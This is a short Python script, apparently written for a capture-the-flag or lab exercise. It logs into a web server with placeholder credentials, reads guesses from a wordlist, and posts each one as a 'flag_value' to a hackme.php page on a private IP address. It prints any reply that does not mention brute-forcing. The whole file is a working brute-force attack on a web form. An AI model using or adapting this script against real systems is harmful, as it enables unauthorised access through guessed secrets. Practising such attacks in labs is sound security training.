import requests
lines = []

with open("whataver","r") as raft:
    lines = raft.readlines()

s = requests.Session()
#maintains session

credentials = {
    'username': 'insert_username',
    'password': 'insert_password'
}
#dictionary form field
response = s.post('insert_Ip_here', data=credentials)
print(response.text)

#response1 = s.post('http://192.168.228.161/hackme.php')
#print(response1.text)

for i in lines:
    mydata = {'flag_value':i.replace("\n","")}

    response2 = s.post('http://192.168.228.161/hackme.php', data=mydata)

    currentpagetext = response2.text

    if "brute-force" not in currentpagetext:
        print(response2.text)
